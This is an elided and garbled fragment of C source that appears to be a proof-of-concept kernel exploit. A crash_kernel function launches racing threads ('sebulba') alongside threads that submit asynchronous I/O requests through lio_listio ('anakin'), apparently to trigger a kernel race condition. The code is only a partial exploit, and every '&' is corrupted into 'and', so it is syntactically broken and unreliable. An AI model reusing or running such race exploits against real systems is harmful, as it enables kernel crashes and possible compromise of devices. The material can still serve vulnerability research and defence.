...
void *anakin(void *a)
{
    ...
    {
        struct aiocb* aio = and aios[i];

        aio->aio_fildes = fd;
        aio->aio_offset = 0;
        aio->aio_buf = and buf[i];
        aio->aio_nbytes = 1;
...
void crash_kernel()
{
    ...
    {
        pthread_create(and racers_threads[i], NULL, sebulba, NULL);
    }
    for(uint32_t i = 0; i < NB_LIO_LISTIO; i++)
    {   
        pthread_create(and lio_listio_threads[i], NULL, anakin, NULL);
    }
